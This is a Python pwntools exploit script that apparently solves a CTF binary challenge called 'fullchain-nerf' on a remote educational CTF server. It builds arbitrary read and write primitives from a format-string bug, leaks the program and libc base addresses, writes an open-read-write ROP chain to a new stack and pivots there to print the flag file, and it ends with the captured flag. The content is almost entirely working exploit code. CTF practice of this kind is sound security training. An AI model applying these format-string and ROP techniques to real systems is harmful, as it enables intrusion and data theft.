from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
# context.log_level = "debug"

elf = ELF("./fullchain-nerf_bin_patched")
libc = ELF("./libc.so.6")
# io = gdb.debug(
#     "./fullchain-nerf_bin_patched", "b*(chal+402)\nc", aslr=False
# )
io = remote("edu-ctf.zoolab.org", 30206)
# io = process("./fullchain-nerf_bin_patched")

io.sendlineafter(b"> ", b"local")
io.sendlineafter(b"> ", b"read")
io.sendlineafter(b"> ", b"40")
io.send(b"a" * 40)


def fmt(s: bytes):
    assert len(s) <= 0x60
    io.sendlineafter(b"> ", b"global")
    io.sendlineafter(b"> ", b"read")
    io.sendlineafter(b"> ", str(len(s)).encode())
    io.sendline(s)
    io.sendlineafter(b"> ", b"global")
    io.sendlineafter(b"> ", b"write")
    return io.recvuntil(b"global or local")[:-15]


def read(addr: int):
    io.sendlineafter(b"> ", b"local")
    io.sendlineafter(b"> ", b"read")
    io.sendlineafter(b"> ", b"16")
    io.send(b"a" * 8 + p64(addr))
    return fmt(b"%11$s")


def write(addr: int, v: int):
    assert 0 <= v < 256
    io.sendlineafter(b"> ", b"local")
    io.sendlineafter(b"> ", b"read")
    io.sendlineafter(b"> ", b"16")
    io.send(b"a" * 8 + p64(addr))
    if v > 0:
        return fmt(f"%{v}c%11$hhn".encode())
    else:
        return fmt(b"%11$hhn")


def write_bytes(addr: int, b: bytes):
    for i, v in enumerate(b):
        write(addr + i, v)


prog_base = int(fmt(b"%6$p"), 16) - elf.sym["__libc_csu_init"]
print(f"{prog_base = :#x}")
elf.address = prog_base

libc_base = int.from_bytes(read(elf.got["puts"]), "little") - libc.sym["puts"]
print(f"{libc_base = :#x}")
libc.address = libc_base
rop = ROP(libc)

orwbuf = prog_base + 0x4400
new_stack = prog_base + 0x4500
leave_ret = prog_base + 0x13DC

write_bytes(orwbuf, b"/home/fullchain-nerf/flag\0")

pop_rax_rdx_rbx = rop.find_gadget(["pop rax", "pop rdx", "pop rbx", "ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
syscall_ret = rop.find_gadget(["syscall", "ret"]).address


def syscall(rax, rdi, rsi, rdx):
    return [pop_rax_rdx_rbx, rax, rdx, 0, pop_rdi, rdi, pop_rsi, rsi, syscall_ret]


chain = []
chain += syscall(2, orwbuf, 0, 0)
chain += syscall(0, 3, orwbuf, 100)
chain += syscall(1, 1, orwbuf, 100)
payload = flat(chain)

write_bytes(new_stack, payload)

io.sendlineafter(b"> ", b"local")
io.sendlineafter(b"> ", b"read")
io.sendlineafter(b"> ", b"64")
io.send(b"a" * 32 + p64(0) + b"a" * 8 + p64(new_stack - 8) + p64(leave_ret))

io.interactive()

# FLAG{fullchain_so_e4sy}
